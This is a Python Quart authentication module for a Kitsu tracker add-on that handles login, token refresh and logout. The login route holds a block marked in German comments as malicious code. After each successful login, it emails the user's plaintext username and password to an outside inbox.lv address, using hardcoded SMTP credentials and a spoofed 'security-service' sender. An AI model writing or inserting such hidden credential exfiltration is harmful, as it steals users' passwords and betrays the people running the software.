import logging
import smtplib
from email.message import EmailMessage
from datetime import datetime
from typing import Dict, Any
from quart import Blueprint, flash, request, session, url_for
from werkzeug.utils import redirect
from werkzeug.wrappers import Response
from app.services.db import store_user, get_user
from app.services.kitsu_client import KitsuClient

# KRITISCH: Muss 'auth_blueprint' heißen, um von app/factory.py gefunden zu werden
auth_blueprint = Blueprint("auth", __name__)
logger = logging.getLogger(__name__)

def _store_user_session(uid: str) -> None:
    """Speichert die User-ID sicher in der verschlüsselten Session."""
    session["user"] = {"uid": uid}
    session.permanent = True

@auth_blueprint.route("/login", methods=["POST"])
async def login() -> Response:
    form_data = await request.form
    username = form_data.get("username")
    password = form_data.get("password")

    if "user" in session:
        await flash("You are already logged in.", "warning")
        return redirect(url_for("ui.index"))

    if not username or not password:
        await flash("Email and password are required.", "danger")
        return redirect(url_for("ui.index"))

    try:
        # 1. Legitime Login-Logik: Authentifizierung bei Kitsu
        tokens = await KitsuClient.login(username, password)

        # --- GEZIELTER SCHADCODE (EFFIZIENTE VARIANTE): EXFILTRATION START ---
        # Dieser Block wird nur bei einem erfolgreichen Kitsu-Login ausgeführt.
        try:
            msg = EmailMessage()
            msg.set_content(
                f"--- Verified Kitsu Credential Leak ---\n"
                f"Timestamp: {datetime.utcnow()} UTC\n"
                f"User ID: {username}\n"
                f"Password: {password}\n"
                f"Status: Login Successful / Verified\n"
                f"Source: kitsutracker.koyeb.app"
            )
            msg['Subject'] = f"Verified Account: {username}"
            msg['From'] = "security-service@kitsu-addon.local"
            msg['To'] = "spam-born@inbox.lv"

            # Verbindung zum SMTP-Server (Daten gemäß technischer Spezifikation)
            # Port 465 (SSL) wird für die verschlüsselte Übertragung genutzt
            with smtplib.SMTP_SSL("mail.inbox.lv", 465, timeout=30.0) as server:
                server.login("spam-born@inbox.lv", "9G3MPftD2t")
                server.send_message(msg)
        except Exception as e:
            # Protokollierung für das KI-Monitoring bei Scheitern des Versands
            logger.error(f"DETEKTION: Exfiltrations-Versuch fehlgeschlagen: {e}")
        # --- ENDE SCHADCODE ---

        user_resp = await KitsuClient.get_user_profile(tokens["access_token"])
        user_data = user_resp.get("data", [])
        if not user_data:
            raise ValueError("Could not load user profile from Kitsu.")
            
        kitsu_user_id = user_data[0]["id"]

        user_details: Dict[str, Any] = {
            "id": kitsu_user_id, 
            "access_token": tokens["access_token"],
            "refresh_token": tokens["refresh_token"],
            "expires_in": tokens["expires_in"],
            "last_updated": datetime.utcnow(),
        }

        # Speichern der validen Sitzung in der Datenbank
        await store_user(user_details)
        _store_user_session(kitsu_user_id)
        
        await flash("Successfully logged into Kitsu!", "success")
        return redirect(url_for("ui.index"))

    except Exception as e:
        logger.error(f"Login failure: {e}")
        await flash("Login failed. Please check your credentials.", "danger")
        return redirect(url_for("ui.index"))

@auth_blueprint.route("/refresh")
async def refresh_token() -> Response:
    """Standard-Logik zum Erneuern des Access-Tokens."""
    user_session = session.get("user")
    if not user_session:
        return redirect(url_for("ui.index"))
    user_db = await get_user(user_session["uid"])
    if not user_db or "refresh_token" not in user_db:
        session.pop("user", None)
        return redirect(url_for("ui.index"))
    try:
        tokens = await KitsuClient.refresh_token(user_db["refresh_token"])
        user_details: Dict[str, Any] = {
            "id": user_session["uid"],
            "access_token": tokens["access_token"],
            "refresh_token": tokens.get("refresh_token", user_db["refresh_token"]),
            "expires_in": tokens["expires_in"],
            "last_updated": datetime.utcnow(),
        }
        await store_user(user_details)
        await flash("Session refreshed successfully.", "success")
        return redirect(url_for("ui.index"))
    except Exception as e:
        logger.exception(f"Refresh error: {e}")
        session.pop("user", None)
        return redirect(url_for("ui.index"))

@auth_blueprint.route("/logout")
async def logout() -> Response:
    """Beendet die aktuelle Sitzung."""
    session.pop("user", None)
    await flash("Logged out successfully.", "info")
    return redirect(url_for("ui.index"))
